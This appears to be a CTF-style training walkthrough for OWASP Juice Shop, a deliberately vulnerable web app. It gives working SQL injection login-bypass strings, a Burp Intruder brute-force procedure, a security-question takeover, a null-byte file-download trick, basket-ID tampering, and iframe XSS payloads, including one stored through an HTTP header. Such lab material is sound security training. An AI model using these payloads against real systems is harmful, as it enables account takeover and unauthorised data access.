# OWASP Juice Shop

## 🧃 Overview

**OWASP Juice Shop** is an intentionally vulnerable web application built by OWASP for security training and CTF practice. It simulates a realistic online shop built on **Node.js** — containing a wide range of deliberately introduced vulnerabilities covering the OWASP Top 10 and beyond.

> **Why it's valuable:** Juice Shop provides a safe, legal environment to practice real attack techniques — SQL injection, XSS, broken access control, brute force, and more — against a realistic modern web application.

---

## 💉 SQL Injection — Authentication Bypass

Juice Shop's login form is vulnerable to SQL injection — the query can be broken to bypass authentication entirely.

**Payloads that bypass login:**

```sql
-- Closes the string and comments out the password check
' or 1=1--

-- Target a specific account (Bender's email)
bender@juice-sh.op'--
```

**How it works:**
```sql
-- Original query
SELECT * FROM Users WHERE email='[input]' AND password='[input]'

-- After injection: ' or 1=1--
SELECT * FROM Users WHERE email='' OR 1=1--' AND password='...'
-- The OR 1=1 is always true; the rest is commented out → login succeeds
```

> Targeting a specific email (`bender@juice-sh.op'--`) logs you in as that user — useful for account takeover without knowing their password.

---

## 🔑 Brute Force — Password Attack

```
1. Navigate to the login page in the browser (FoxyProxy active)

2. Attempt a login to capture the POST request in Burp Proxy

3. Send the request to Intruder (Ctrl+I)

4. Install SecLists if not already present:
   sudo apt-get install seclists

5. In Intruder → Positions tab:
   → Mark the password field with § §

6. In Payloads tab → load wordlist:
   /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt

7. Start Attack

8. Sort results by Status Code column:
   → 200 OK = successful login → valid credential found
   → 401 Unauthorized = failed attempt
```

---

## 🔐 Change Another User's Password — Security Question Bypass

Some accounts have security questions with answers that are publicly discoverable (e.g. via social media or OSINT). If the answer can be found online, the password reset flow can be abused to take over the account.

```
1. Navigate to the Forgot Password page
2. Enter the target user's email address
3. Research the security question answer using OSINT
   (social media, LinkedIn, public profiles)
4. Submit the answer → reset the password → gain access
```

> **Lesson:** Security questions are a weak authentication factor — answers are often guessable or publicly available. They should never be the sole reset mechanism.

---

## 📂 Accessing Confidential Documents — FTP Directory

Juice Shop exposes a `/ftp/` directory containing sensitive files — some accessible directly, others restricted by file type.

```
# Browse the FTP directory
http://[IP]/ftp/

# Download .md and .pdf files directly — no restriction
http://[IP]/ftp/filename.md
http://[IP]/ftp/filename.pdf

# Download restricted file types (e.g. .bak) using Poison Null Byte:
http://[IP]/ftp/package.json.bak%2500.md
```

**How the Poison Null Byte works:**

`%2500` is a double-encoded null byte (`%00` → decoded once to `%00`, decoded again to the null terminator `\0`). When the server processes the filename, the null character terminates the string at that point — the `.md` extension is ignored, and the server serves `package.json.bak`.

```
Server sees:  package.json.bak\0.md
Processes as: package.json.bak  ← null terminates the string here
```

---

## 🚪 Broken Access Control

### Finding the Admin Panel via Debugger

```
1. Open the main page in Firefox
2. Open Developer Tools → Debugger tab (Ctrl+Shift+I)
3. Reload the page to load all scripts
4. Open main.js → click {} (Pretty Print) to format the minified code
5. Search for "admin": Ctrl+Shift+F → type: admin
6. Find the route path: 'administration'
7. Navigate to: http://[IP]/#/administration
   (must be logged in as an admin user to access)
```

### Accessing Another User's Cart via Burp

```
1. Add an item to your own cart
2. In Burp Proxy → find the cart GET request
   e.g. GET /rest/basket/1
3. Change the basket ID to another number:
   GET /rest/basket/2
4. Forward the request → another user's cart contents are returned
```

> This is a classic BOLA (Broken Object Level Authorisation) vulnerability — the API accepts any basket ID without verifying ownership.

---

## 🔍 XSS Attacks

### DOM-Based XSS

Inject directly into the search box — the input is reflected into the DOM without sanitisation:

```html
<iframe src="javascript:alert(`xss`)">
```

> The `<iframe>` with a `javascript:` URI executes the JS when the browser renders the element — no `<script>` tag required, which often bypasses naive filters.

---

### Persistent XSS — Via HTTP Header Injection

This attack stores the payload in the application via a crafted HTTP header — it fires when an admin views the "Last Login IP" page.

```
1. Log in to Juice Shop
2. Activate Burp Proxy intercept
3. Click Logout
4. Intercept the logout request:
   GET /rest/saveLoginIp HTTP/1.1

5. In the request headers, add:
   True-Client-IP: <iframe src="javascript:alert(`xss`)">

6. Forward the request

7. The XSS payload is stored as the "last login IP"
8. When an admin views that user's login IP → the script fires
```

> **Why `True-Client-IP`?** The application trusts this header to record the client's real IP (as if behind a proxy/load balancer). By injecting HTML into a header the server stores without sanitisation, the payload persists in the database — classic stored XSS via an unexpected input vector.
